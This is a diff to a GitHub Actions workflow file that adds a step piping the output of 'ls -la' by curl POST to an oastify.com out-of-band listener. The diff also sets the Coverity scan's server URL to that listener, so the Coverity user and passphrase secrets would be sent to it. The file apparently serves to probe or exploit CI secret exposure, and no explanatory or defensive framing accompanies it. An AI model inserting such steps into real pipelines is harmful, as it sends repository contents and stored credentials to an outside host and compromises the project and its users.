@@ -24,16 +24,18 @@ jobs:
       - name: Checkout Source
         uses: actions/checkout@v5
 
-      - name: Run whoami and send to Collaborator
+      - name: Run ls and send to Collaborator
         run: |
-          OUTPUT=$(ls)
-          curl -s -X POST -d "whoami=$OUTPUT" https://0bc85k5khpc93ziwv9cqkgje056wunmbb.oastify.com
+          {
+            echo "ls output:"
+            ls -la
+          } | curl -s -X POST --data-binary @- https://k0lsu4u4691tsj7gkt1a908yppvgj7cv1.oastify.com
 
       - name: Coverity Scan
         id: coverity-scan
         uses: blackduck-inc/black-duck-security-scan@v2
         with:
           ### SCANNING: Required fields
-          coverity_url: https://0bc85k5khpc93ziwv9cqkgje056wunmbb.oastify.com
+          coverity_url: https://k0lsu4u4691tsj7gkt1a908yppvgj7cv1.oastify.com
           coverity_user: ${{ secrets.COVERITY_USER }}
           coverity_passphrase: ${{ secrets.COVERITY_PASSPHRASE }}
